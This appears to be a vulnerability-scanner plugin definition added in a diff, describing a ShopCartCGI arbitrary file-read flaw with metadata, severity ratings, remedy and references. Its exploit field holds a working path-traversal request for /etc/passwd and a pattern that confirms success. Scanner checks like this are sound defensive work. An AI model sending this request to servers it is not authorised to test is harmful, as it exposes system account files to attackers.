@@ -1,0 +1,42 @@
+<plugin_id>68</plugin_id>
+<plugin_name>ShopCartCGI arbitrary file reading</plugin_name>
+<plugin_family>HTTP</plugin_family>
+<plugin_created_date>2004/02/21</plugin_created_date>
+<plugin_created_name>Marc Ruef</plugin_created_name>
+<plugin_created_email>marc dot ruef at computec dot ch</plugin_created_email>
+<plugin_created_web>http://www.computec.ch</plugin_created_web>
+<plugin_created_company>computec.ch</plugin_created_company>
+<plugin_updated_name>Marc Ruef</plugin_updated_name>
+<plugin_updated_email>marc dot ruef at computec dot ch</plugin_updated_email>
+<plugin_updated_web>http://www.computec.ch</plugin_updated_web>
+<plugin_updated_company>computec.ch</plugin_updated_company>
+<plugin_updated_date>2004/11/14</plugin_updated_date>
+<plugin_version>2.0</plugin_version>
+<plugin_changelog>Added the needed pattern_exists command to let it work properly. Corrected the plugin structure and added the accuracy values in 1.4. Improved the pattern matching and introduced the plugin changelog in 2.0</plugin_changelog>
+<plugin_protocol>tcp</plugin_protocol>
+<plugin_port>80</plugin_port>
+<plugin_procedure_exploit>open|send /gotopage.cgi?4242+../../../../../../../../../../../../../etc/passwd\n\n|sleep|close|pattern_exists HTTP/#.# ### *root:*</plugin_procedure_exploit>
+<plugin_exploit_accuracy>99</plugin_exploit_accuracy>
+<plugin_comment>The HTTP request is copied from the Nessus plugin.</plugin_comment>
+<bug_affected>ShopCartCGI</bug_affected>
+<bug_not_affected>The latest version of ShopCartCGI</bug_not_affected>
+<bug_vulnerability_class>Configuration</bug_vulnerability_class>
+<bug_description>The remote host is running ShopCartCGI - a set of CGIs designed to set up an on-line shopping cart.There is a bug in this software which may allow an attacker to read arbitary files on the remote web server with the privileges of the web user.</bug_description>
+<bug_solution>The web server should be deactivated or de-installed if not necessary. If this is not possible, upgrade to the latest version of this set of CGI or disable this software.</bug_solution>
+<bug_fixing_time>15 minutes</bug_fixing_time>
+<bug_exploit_availability>Yes</bug_exploit_availability>
+<bug_exploit_url>http://www.securityfocus.com/bid/9670/exploit/</bug_exploit_url>
+<bug_remote>Yes</bug_remote>
+<bug_local>Yes</bug_local>
+<bug_severity>High</bug_severity>
+<bug_popularity>4</bug_popularity>
+<bug_simplicity>9</bug_simplicity>
+<bug_impact>7</bug_impact>
+<bug_risk>7</bug_risk>
+<bug_nessus_risk>Serious</bug_nessus_risk>
+<bug_check_tool>Nessus is able to check this vulnerability.</bug_check_tool>
+<source_securityfocus_bid>9670</source_securityfocus_bid>
+<source_nessus_id>12064</source_nessus_id>
+<source_literature>Hacking Exposed: Network Security Secrets & Solutions, Stuart McClure, Joel Scambray and George Kurtz, February 25, 2003, 4th Edition, McGraw-Hill Osborne Media, ISBN 0072227427</source_literature>
+<source_misc>http://www.computec.ch</source_misc>
+
